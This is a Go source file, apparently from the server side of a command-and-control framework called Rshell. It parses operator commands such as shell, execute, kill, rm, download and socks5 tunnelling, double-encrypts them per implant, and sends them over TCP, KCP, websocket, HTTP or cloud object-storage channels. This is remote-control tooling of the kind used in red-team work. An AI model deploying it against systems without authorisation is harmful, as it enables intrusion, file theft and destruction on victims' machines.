package sendcommand

import (
	"Rshell/pkg/command"
	"Rshell/pkg/connection"
	"Rshell/pkg/connection/kcp"
	"Rshell/pkg/connection/oss"
	"Rshell/pkg/connection/tcp"
	ws "Rshell/pkg/connection/websocket"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/utils"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math"
	"strconv"
	"strings"
	"time"
)

// cmdSpec defines a command's prefix and its command type ID.
type cmdSpec struct {
	prefix    string
	cmdType   uint32
	hasArg    bool
	parseArg  func(string) []byte // custom arg parser, nil means raw string arg
}

var cmdTable = []cmdSpec{
	{prefix: "shell ", cmdType: command.SHELL, hasArg: true},
	{prefix: "cd ", cmdType: command.CD, hasArg: true},
	{prefix: "sleep ", cmdType: command.SLEEP, hasArg: true, parseArg: parseSleepArg},
	{prefix: "pause ", cmdType: command.PAUSE, hasArg: true, parseArg: parseSleepArg},
	{prefix: "pwd", cmdType: command.PWD, hasArg: false},
	{prefix: "exit", cmdType: command.EXIT, hasArg: false},
	{prefix: "kill ", cmdType: command.KILL, hasArg: true, parseArg: parseKillArg},
	{prefix: "mkdir ", cmdType: command.MKDIR, hasArg: true},
	{prefix: "drives", cmdType: command.DRIVES, hasArg: false},
	{prefix: "rm ", cmdType: command.RM, hasArg: true},
	{prefix: "cp ", cmdType: command.CP, hasArg: true},
	{prefix: "mv ", cmdType: command.MV, hasArg: true},
	{prefix: "execute ", cmdType: command.EXECUTE, hasArg: true},
	{prefix: "ps", cmdType: command.PS, hasArg: false},
	{prefix: "filebrowse ", cmdType: command.FileBrowse, hasArg: true},
	{prefix: "download ", cmdType: command.DOWNLOAD, hasArg: true},
	{prefix: "filecontent ", cmdType: command.FileContent, hasArg: true},
	{prefix: "socks5data ", cmdType: command.Socks5Data, hasArg: true},
}

func parseCommand(input string) ([]byte, bool) {
	for _, spec := range cmdTable {
		if spec.hasArg {
			if strings.HasPrefix(input, spec.prefix) {
				arg := strings.TrimPrefix(input, spec.prefix)
				cmdTypeBytes := make([]byte, 4)
				binary.BigEndian.PutUint32(cmdTypeBytes, uint32(spec.cmdType))
				if spec.parseArg != nil {
					return append(cmdTypeBytes, spec.parseArg(arg)...), true
				}
				return append(cmdTypeBytes, []byte(arg)...), true
			}
		} else {
			if input == spec.prefix {
				cmdTypeBytes := make([]byte, 4)
				binary.BigEndian.PutUint32(cmdTypeBytes, uint32(spec.cmdType))
				return cmdTypeBytes, true
			}
		}
	}
	return nil, false
}

func parseSleepArg(arg string) []byte {
	sleepTime, _ := strconv.Atoi(arg)
	sleepTime = sleepTime * 1000
	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, uint32(sleepTime))
	return buf
}

func parseKillArg(arg string) []byte {
	pid, err := strconv.ParseInt(arg, 10, 64)
	if err != nil || pid < 0 || pid > math.MaxUint32 {
		return nil
	}
	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, uint32(pid))
	return buf
}

// sendToTransport routes encrypted payload to the correct transport.
func sendToTransport(uid string, payload []byte) {
	transport, _ := connection.GlobalManager.GetListenerType(uid)
	switch transport {
	case "web":
		command.CommandQueues.AddCommand(uid, payload)
	case "websocket":
		cmdBytes, _ := encrypt.Encrypt(payload, uid)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
		cmdBase64 := encodeBase64(cmdBytes)
		ws.SendToClient(uid, cmdBase64)
	case "tcp":
		cmdBytes, _ := encrypt.Encrypt(payload, uid)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
		cmdBase64 := encodeBase64(cmdBytes)
		msgToSend := frameMessage(cmdBase64)
		tcp.SendToClient(uid, msgToSend)
	case "kcp":
		cmdBytes, _ := encrypt.Encrypt(payload, uid)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
		cmdBase64 := encodeBase64(cmdBytes)
		msgToSend := frameMessage(cmdBase64)
		kcp.SendToClient(uid, msgToSend)
	case "oss":
		cmdBytes, _ := encrypt.Encrypt(payload, uid)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
		cmdBase64 := encodeBase64(cmdBytes)
		oss.Send(oss.Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
	}
}

func encodeBase64(data []byte) []byte {
	enc := make([]byte, base64.StdEncoding.EncodedLen(len(data)))
	base64.StdEncoding.Encode(enc, data)
	return enc
}

func frameMessage(data []byte) []byte {
	return utils.BytesCombine(utils.WriteInt(len(data)), data)
}

func resolveUID(uid string) string {
	if realUID, exists := connection.GlobalUIDMapper.GetRealUID(uid); exists {
		return realUID
	}
	return uid
}

func SendCommand(uid string, commandStr string) {
	uid = resolveUID(uid)

	if strings.HasPrefix(commandStr, "clear") {
		var shell database.Shell
		database.Engine.Where("uid = ?", uid).Get(&shell)
		shell.ShellContent = "$ clear"
		database.Engine.Where("uid = ?", uid).Update(&shell)
		return
	}

	byteToSend, ok := parseCommand(commandStr)
	if !ok {
		return
	}

	sendToTransport(uid, byteToSend)
}

func SendCommandBytes(uid string, byteToSend []byte) {
	uid = resolveUID(uid)
	sendToTransport(uid, byteToSend)
}
